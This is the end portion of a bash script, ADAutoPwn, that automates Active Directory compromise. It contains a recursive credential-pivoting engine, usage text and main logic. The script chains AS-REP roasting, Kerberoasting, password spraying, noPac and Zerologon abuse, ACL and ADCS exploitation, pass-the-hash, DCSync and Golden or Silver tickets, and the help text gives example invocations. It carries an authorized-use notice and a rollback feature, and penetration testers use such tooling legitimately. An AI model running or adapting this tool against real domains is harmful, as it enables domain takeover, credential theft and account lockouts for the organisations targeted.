    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Web UI${C_RESET}      ${web_state}"
    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Log${C_RESET}         ${C_DIM}$LOGFILE${C_RESET}"
    detail "${C_GREY}    ╠══════════════════════════════════════════════════════════════════╣${C_RESET}"
    detail "    ${C_GREY}║${C_RESET} ${C_DIM}Rollback file:${C_RESET} ${ROLLBACK_FILE:-n/a}"
    detail "    ${C_GREY}║${C_RESET} ${C_DIM}Run cleanup:${C_RESET}  $0 -t ${DC_IP:-<dc-ip>} -o '$OUTDIR' --cleanup"
    detail "${C_GREY}    ╚══════════════════════════════════════════════════════════════════╝${C_RESET}"
}

_atexit() { [[ -n "$SUDO_KEEPALIVE_PID" ]] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null; }

# Ctrl-C = SKIP the current (possibly stuck) step and continue, instead of killing the
# whole run — a single SIGINT interrupts the foreground command, the handler returns,
# and the script moves on to the next step. Press Ctrl-C TWICE within 2s to actually
# abort. This is what makes a hung nxc/evil-winrm/certipy call recoverable without
# losing the whole assessment.
_LAST_SIGINT=0
_on_sigint() {
    local now=${SECONDS:-0}
    if (( now - _LAST_SIGINT <= 2 )) && (( _LAST_SIGINT > 0 )); then
        printf '\n'; warn "Second Ctrl-C → aborting ADAutoPwn"
        exit 130
    fi
    _LAST_SIGINT=$now
    printf '\n'; warn "Ctrl-C → skipping current step (press Ctrl-C again within 2s to QUIT the whole run)"
}
trap _atexit EXIT TERM
trap _on_sigint INT

# ===========================================================================
#  PIVOTING ENGINE  —  assess each credential, recurse on what it unlocks
# ===========================================================================
BH_DONE=0

assess_current_credential() {
    SEEN_CREDS["$(cred_key "$USER" "$PASS" "$HASH")"]=1
    HAVE_AUTH=0; IS_DC_ADMIN=0; KERB_TICKET=""; unset KRB5CCNAME

    section "ASSESSING IDENTITY · ${USER}"
    info "Credential: ${C_BOLD}${USER}${C_RESET} $( [[ -n "$HASH" ]] && echo '(NT hash / PtH)' || echo '(password)')"

    phase_validate_creds
    [[ "$HAVE_AUTH" != "1" ]] && { warn "Skipping further phases for $USER (no valid auth)"; return; }

    record_owned_identity        # log this compromised identity + its groups (for the summary)

    # Already local admin on the DC → game over for this identity. Every remaining
    # per-identity phase (shares, LAPS/gMSA, WinRM, token privs, ACL hunting, ESC,
    # BloodHound edge abuse) exists only to ESCALATE — pointless now. Collect
    # BloodHound once (for the graph/report) and DCSync; skip the rest.
    if [[ "$IS_DC_ADMIN" == "1" ]]; then
        info "${USER} is already DC admin → skipping enumeration/escalation phases, going straight to DCSync"
        OWNED_ADMIN["${USER,,}"]=1
        if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
        phase_dcsync;       jitter
        phase_password_spray
        return
    fi

    phase_auth_enum;    jitter
    phase_attack_surface; jitter
    phase_cve_checks;   jitter
    phase_nopac_abuse;  jitter
    phase_zerologon_abuse; jitter
    phase_delegation_abuse; jitter
    phase_unconstrained_abuse; jitter
    phase_precreated_computers; jitter
    phase_user_variants; jitter
    phase_share_loot;   jitter
    phase_secrets;      jitter
    phase_sccm;         jitter
    phase_wsus;         jitter
    phase_winrm_dpapi;  jitter
    phase_acl;          jitter
    phase_recycle_disabled; jitter
    phase_relay;        jitter
    phase_trusts;       jitter
    phase_rodc_abuse;   jitter
    phase_asreproast;   jitter
    phase_kerberoast;   jitter
    phase_adcs;         jitter
    if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
    phase_bh_abuse;     jitter   # mine THIS identity's BloodHound edges (catches what get-writable misses, e.g. AddSelf)
    phase_dcsync;       jitter
    phase_post_da;      jitter   # DSRM + Golden/Silver — only fires once krbtgt is in hand (full DA)
    # Spray everything we recovered this round across all users → new pivots
    phase_password_spray
}

process_queue() {
    local entry u p h
    while [[ ${#CRED_QUEUE[@]} -gt 0 ]]; do
        entry="${CRED_QUEUE[0]}"
        CRED_QUEUE=("${CRED_QUEUE[@]:1}")        # dequeue (FIFO)
        IFS='|' read -r u p h <<<"$entry"
        [[ -n "${SEEN_CREDS[$(cred_key "$u" "$p" "$h")]:-}" || -n "${SEEN_CREDS[${u,,}|*|*]:-}" ]] && continue
        USER="$u"; PASS="$p"; HASH="$h"
        assess_current_credential
    done
}

# ===========================================================================
#  USAGE
# ===========================================================================
usage() {
    banner
cat <<EOF

${C_CYAN}${C_BOLD}USAGE${C_RESET}
  $0 -t <DC_IP> [-d <domain>] [-u <user>] [-p <pass> | -H <nt_hash>] [options]

${C_CYAN}${C_BOLD}REQUIRED${C_RESET}
  ${C_GREEN}-t${C_RESET} <ip>        Domain Controller IP address

${C_CYAN}${C_BOLD}CREDENTIALS${C_RESET} ${C_DIM}(optional — without any, every unauthenticated phase still runs)${C_RESET}
  ${C_GREEN}-d${C_RESET} <domain>    Domain FQDN (e.g. corp.local). Auto-detected via SMB if omitted
  ${C_GREEN}-u${C_RESET} <user>      Domain username
  ${C_GREEN}-p${C_RESET} <pass>      Cleartext password
  ${C_GREEN}-H${C_RESET} <hash>      NT hash for pass-the-hash (LM:NT or just NT)

${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
  ${C_GREEN}-o${C_RESET} <dir>       Output/loot directory          ${C_DIM}(default: ./loot_<domain>_<date>)${C_RESET}
  ${C_GREEN}-w${C_RESET} <wordlist>  Wordlist for cracking          ${C_DIM}(default: $WORDLIST)${C_RESET}
  ${C_GREEN}--sudo-pass${C_RESET} <p> Sudo password for unattended /etc/hosts + time sync
                ${C_DIM}(or export SUDO_PASS=…). Needed when running headless${C_RESET}
  ${C_GREEN}--creds-file${C_RESET} <f> Feed extra credentials to continue from (lines ${C_DIM}user:password${C_RESET}
                or ${C_DIM}user:nthash${C_RESET}). Each one is assessed and pivots recursively
  ${C_GREEN}--users-file${C_RESET} <f> Merge an external username list (for spray / AS-REP / variants)

  ${C_DIM}── toggles (no value) ──${C_RESET}
  ${C_GREEN}--no-crack${C_RESET}     Disable hash cracking ${C_DIM}(cracking is ON by default)${C_RESET}
  ${C_GREEN}--spray${C_RESET}        Also spray the domain-focused wordlist ONLINE ${C_YELLOW}(account-lockout risk)${C_RESET}
  ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                accounts. Off by default → ACLs only reported. Rollback-tracked
  ${C_GREEN}--deep-cve${C_RESET}     Run slower/noisier CVE modules such as PrintNightmare. Default CVE checks
                stay fast and use spooler/coerce_plus as actionable signals
  ${C_GREEN}--auto-pwn${C_RESET}     Alias for ${C_GREEN}--abuse --spray -y${C_RESET} (kept for convenience; the real
                escalation switch is ${C_GREEN}--abuse${C_RESET})
  ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
                original loot dir so it can read its rollback.log
  ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
  ${C_GREEN}--ntlm${C_RESET}         Force NTLM auth ${C_DIM}(default is Kerberos-first)${C_RESET}
  ${C_GREEN}--no-bh${C_RESET}        Skip BloodHound collection
  ${C_GREEN}--no-open${C_RESET}      Don't auto-open graph.html / the web UI in a browser
  ${C_GREEN}--web${C_RESET}, ${C_GREEN}--adautograph${C_RESET}   Open results in the ADAutoGraph web UI (also forces it in ${C_BOLD}--graph${C_RESET} mode)
  ${C_GREEN}--no-web${C_RESET}       Don't auto-launch the ADAutoGraph web UI + import BloodHound data
  ${C_GREEN}--web-port${C_RESET} <n> Port for the ADAutoGraph web UI (default 8765)
  ${C_GREEN}-y, --yes${C_RESET}      Assume "yes" to all prompts — fully unattended run
  ${C_GREEN}--no-color${C_RESET}     Disable colored output (also honored via NO_COLOR=1)
  ${C_GREEN}-h, --help${C_RESET}     Show this help

${C_CYAN}${C_BOLD}STANDALONE GRAPH${C_RESET} ${C_DIM}(no scan — just visualize a BloodHound zip)${C_RESET}
  ${C_GREEN}--graph${C_RESET} <zip>   Render any BloodHound .zip into the interactive ${C_BOLD}graph.html${C_RESET}
                and open it. Domain auto-detected from the data
  ${C_GREEN}--owned${C_RESET} <file>  Mark these principals (one per line) as compromised in the graph
  ${C_DIM}add ${C_GREEN}--web${C_DIM} to import the zip into the ADAutoGraph web UI instead of graph.html${C_RESET}
  ${C_DIM}e.g.  $0 --graph ~/Downloads/bloodhound.zip [--web]${C_RESET}

${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gated by what your access unlocks)${C_RESET}
  ${C_PURPLE}0${C_RESET}  Discovery      nmap of AD ports, SMB fingerprint → hostname/domain/FQDN
  ${C_PURPLE}1${C_RESET}  Host & time    auto /etc/hosts entry + clock sync with DC (Kerberos prereq)
  ${C_PURPLE}2${C_RESET}  Unauth enum    null/guest sessions, anon shares, RID brute, rpcclient,
                    LDAP anon bind, enum4linux-ng, kerbrute userenum
  ${C_PURPLE}3${C_RESET}  AS-REP roast   GetNPUsers against discovered users (no creds needed)
  ${C_PURPLE}+${C_RESET}  Timeroast      MS-SNTP machine-account hashes → crack/pivot automatically
  ${C_PURPLE}4${C_RESET}  Validate+TGT   verify creds, request & cache a Kerberos TGT (reused after)
  ${C_PURPLE}5${C_RESET}  Auth enum      users, groups, pass policy, descriptions, shares, MAQ
  ${C_PURPLE}+${C_RESET}  Secrets        descriptions/GPP/LAPS/gMSA/dMSA reads (auto-pivot on recovered creds)
  ${C_PURPLE}+${C_RESET}  Precreated PC  validate default computer-account passwords and pivot
  ${C_PURPLE}+${C_RESET}  ACL/delegation exploitable rights + constrained delegation; ${C_GREEN}--abuse${C_RESET}
                    turns them into creds/tickets/DCSync automatically
  ${C_PURPLE}+${C_RESET}  Trusts         domain/forest trusts, foreign principals, cross-forest roast
  ${C_PURPLE}6${C_RESET}  Kerberoast     GetUserSPNs for SPN accounts (+ cross-forest)
  ${C_PURPLE}7${C_RESET}  ADCS           certipy scan for ESC1..ESC16 vulnerable templates
  ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip ${C_BOLD}+ interactive graph.html${C_RESET}
  ${C_PURPLE}9${C_RESET}  DCSync         secretsdump -just-dc when privileges allow → all NTLM hashes
  ${C_PURPLE}+${C_RESET}  Report         consolidated ${C_BOLD}report.md${C_RESET} + tidy loot (enum/ · secrets/ · raw/)
  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA / dMSA / ESC) is
                    re-fed and the whole chain repeats until nothing new appears

${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
  ${C_DIM}# Zero-credential recon (users, AS-REP, anon shares, trusts)${C_RESET}
  $0 -t 10.10.10.10

  ${C_DIM}# Full authenticated, auto-cracking, fully unattended (Kerberos default)${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack -y

  ${C_DIM}# Go loud: also abuse ACLs (add to groups / reset passwords) with rollback${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack --abuse

  ${C_DIM}# Pass-the-hash straight through to DCSync${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

  ${C_DIM}# Quiet engagement${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --stealth

  ${C_DIM}# Clean up after yourself (revert group adds, etc.)${C_RESET}
  $0 -t 10.10.10.10 --cleanup -o loot_corp.local_20260607_2210

${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(tidied at the end — trophies on top, the rest grouped)${C_RESET}
  loot_<dom>_<date>/
   ├─ ${C_BOLD}report.md${C_RESET}        consolidated, human-readable engagement report
   ├─ ${C_BOLD}graph.html${C_RESET}       interactive offline attack graph (auto-opens)
   ├─ users_all.txt · found_passwords.txt · credential_map.txt · *.ccache
   ├─ asrep_hashes.txt · kerberoast_hashes.txt · secretsdump.txt · rollback.log
   ├─ timeroast_hashes.txt
   ├─ enum/           users/groups/policy, nmap, domain wordlist
   ├─ secrets/        LAPS · gMSA/dMSA · GPP · DPAPI · ACL dumps · trusts · ADCS · coercion
   ├─ shares/         looted share contents
   ├─ bloodhound/     collection .zip
   └─ raw/            misc intermediates

${C_YELLOW}${C_BOLD}⚠  LEGAL:${C_RESET} ${C_YELLOW}Use only against systems you are explicitly authorized to test
   (signed engagement, your own lab, or a CTF you're entitled to play).${C_RESET}
EOF
}

# ===========================================================================
#  ARGUMENT PARSING
# ===========================================================================
parse_args() {
    [[ $# -eq 0 ]] && { usage; exit 0; }
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t) DC_IP="$2"; shift 2;;
            -d) DOMAIN="$2"; shift 2;;
            -u) USER="$2"; shift 2;;
            -p) PASS="$2"; shift 2;;
            -H) HASH="$2"; shift 2;;
            -o) OUTDIR="$2"; shift 2;;
            -w) WORDLIST="$2"; shift 2;;
            --sudo-pass) SUDO_PASS="$2"; shift 2;;
            --creds-file) CREDS_FILE="$2"; shift 2;;
            --users-file) USERS_FILE="$2"; shift 2;;
            --spray) SPRAY_GEN=1; shift;;
            --auto-pwn|--full-auto) DO_ABUSE=1; AUTO_YES=1; SPRAY_GEN=1; shift;;
            --crack) DO_CRACK=1; shift;;
            --no-crack) DO_CRACK=0; shift;;
            --abuse) DO_ABUSE=1; shift;;
            --deep-cve) DEEP_CVE=1; shift;;
            --cleanup) DO_CLEANUP=1; shift;;
            --graph) GRAPH_ZIP="$2"; shift 2;;
            --owned) OWNED_FILE="$2"; shift 2;;
            --no-open) NO_OPEN=1; shift;;
            --no-web) WEB_UI=0; shift;;
            --web|--adautograph) WEB_UI=1; WEB_FORCE=1; shift;;
            --web-port) ADAUTOGRAPH_PORT="$2"; shift 2;;
            --stealth) STEALTH=1; shift;;
            --ntlm) KERBEROS=0; shift;;
            --no-bh) DO_BLOODHOUND=0; shift;;
            -y|--yes) AUTO_YES=1; shift;;
            --no-color) NO_COLOR=1; shift;;
            -h|--help) usage; exit 0;;
            *) err "Unknown option: $1"; usage; exit 1;;
        esac
    done
    [[ -z "$DC_IP" && -z "$GRAPH_ZIP" ]] && { err "Missing -t <DC_IP>  (or --graph <bloodhound.zip>)"; exit 1; }
}

# ===========================================================================
#  MAIN
# ===========================================================================
main() {
    parse_args "$@"
    clear 2>/dev/null
    banner

    # Standalone graph mode: render a BloodHound zip → graph.html and exit
    if [[ -n "$GRAPH_ZIP" ]]; then
        [[ -n "$OUTDIR" ]] && { mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"; }
        graph_only_mode
        exit 0
    fi

    # If launched from *inside* an existing loot dir (it has our log), reuse it
    # instead of nesting loot_/loot_. This makes a plain re-run resume cleanly.
    if [[ -z "$OUTDIR" && -f "./adautopwn.log" && "$(basename "$PWD")" == loot_* ]]; then
        OUTDIR="$PWD"
        warn "Detected an existing loot dir in CWD → reusing it (resume) instead of nesting"
    fi
    [[ -z "$OUTDIR" ]] && OUTDIR="loot_${DOMAIN:-$DC_IP}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"
    LOGFILE="$OUTDIR/adautopwn.log"; : >"$LOGFILE"
    ROLLBACK_FILE="$OUTDIR/rollback.log"
    info "Loot and logs in: ${C_BOLD}$OUTDIR${C_RESET}"

    # Cleanup mode: revert tracked changes and exit
    if [[ "$DO_CLEANUP" == "1" ]]; then
        [[ ! -s "$ROLLBACK_FILE" ]] && warn "Tip: point -o at the original loot dir that holds rollback.log"
        run_cleanup
        exit 0
    fi

    check_deps
    request_sudo

    # --- One-time, unauthenticated groundwork ---
    phase_discovery
    gen_domain_wordlist          # build target-specific candidates once domain is known
    phase_hosts_time
    phase_unauth
    phase_asreproast
    phase_timeroast
    phase_cve_checks

    # --- Self-feed: resume context + ingest anything the operator found manually ---
    # Resume recovered passwords if reusing an existing loot dir
    if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
        local _resume_pw; _resume_pw="$(mktemp)"
        sort -u "$OUTDIR/found_passwords.txt" >"$_resume_pw"
        : >"$OUTDIR/found_passwords.txt"
        while IFS= read -r p; do [[ -n "$p" ]] && add_secret "$p" "resumed from previous loot"; done <"$_resume_pw"
        rm -f "$_resume_pw"
        info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") recovered password candidate(s)"
    fi
    # Resume: don't re-pwn identities already compromised on this loot dir. Loading
    # them into SEEN_CREDS makes process_queue skip them, so re-running (e.g. with
    # --creds-file adding a new lead) continues the chain instead of redoing every
    # account we already owned.
    if [[ -s "$OUTDIR/owned_principals.txt" ]]; then
        local _ou _n=0
        while IFS=$'\t' read -r _ou _; do
            [[ -n "$_ou" ]] && { SEEN_CREDS["${_ou,,}|*|*"]=1; _n=$((_n+1)); }
        done <"$OUTDIR/owned_principals.txt"
        [[ "$_n" -gt 0 ]] && info "Resume: $_n already-owned identity/identities will be skipped (won't re-pwn)"
    fi
    # Merge an externally-supplied user list (for spray / AS-REP)
    if [[ -n "$USERS_FILE" && -s "$USERS_FILE" ]]; then
        cat "$USERS_FILE" "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$OUTDIR/users_all.txt.tmp"
        mv "$OUTDIR/users_all.txt.tmp" "$OUTDIR/users_all.txt"
        ok "Merged $(wc -l <"$USERS_FILE") external users → users_all.txt"
    fi

    # --- Seed the queue: supplied credential + any creds file, then pivot ---
    # Inline cracking/looting inside each phase feeds newly recovered creds back
    # into the queue, so process_queue keeps draining until nothing new appears.
    [[ -n "$USER" ]] && queue_cred "$USER" "$PASS" "$HASH"
    if [[ -n "$CREDS_FILE" && -s "$CREDS_FILE" ]]; then
        info "Ingesting credentials from $CREDS_FILE"
        while IFS= read -r line; do
            [[ -z "$line" || "$line" == \#* ]] && continue
            local cu cs; cu="${line%%:*}"; cs="${line#*:}"
            [[ "$cu" == "$cs" ]] && cs=""        # line had no ':' separator
            if [[ "$cs" =~ ^[a-fA-F0-9]{32}$ ]]; then queue_cred "$cu" "" "$cs"
            else queue_cred "$cu" "$cs" ""; [[ -n "$cs" ]] && add_secret "$cs"; fi
        done <"$CREDS_FILE"
    fi
    # Anonymous start with no foothold yet. Rebuild the user list from EVERY source
    # (RID-brute, rpcclient, anon-share file content + folder names, …) so any seeding
    # spray covers them all — the foothold user is whoever a spray flags, never a
    # hard-coded name.
    if [[ ${#CRED_QUEUE[@]} -eq 0 && -z "$USER" && -z "$HASH" ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        # Prefer the kerbrute-confirmed list when we have one (drops share folders that
        # aren't real users); else spray every mined candidate.
        local _seed_ul="$OUTDIR/users_all.txt"
        [[ -s "$OUTDIR/users_valid.txt" ]] && _seed_ul="$OUTDIR/users_valid.txt"
        if [[ -s "$_seed_ul" ]]; then
            # (1) ALWAYS try the empty password + username==password — a cheap classic
            #     anonymous foothold that needs no harvested secret.
            section "SEEDING · empty / username=password spray × enumerated users (anonymous)"
            _seed_anon_weak_spray "$_seed_ul"
        else
            warn "No users enumerated (RID-brute/RPC denied, no share-mined names) — pass --users-file <list> to seed the spray"
        fi
    fi
    # (2) If we harvested any passwords (e.g. from anon shares), spray those too.
    if [[ ${#CRED_QUEUE[@]} -eq 0 && ${#FOUND_SECRETS[@]} -gt 0 ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        if [[ -s "$OUTDIR/users_all.txt" ]]; then
            section "SEEDING · spray harvested passwords × enumerated users (no foothold yet)"
            info "Spraying $(grep -c . "$OUTDIR/users_all.txt") users (RID-brute + rpc + share-mined) with ${#FOUND_SECRETS[@]} harvested password(s)"
            phase_password_spray
        fi
    fi
    process_queue

    final_summary
}

main "$@"
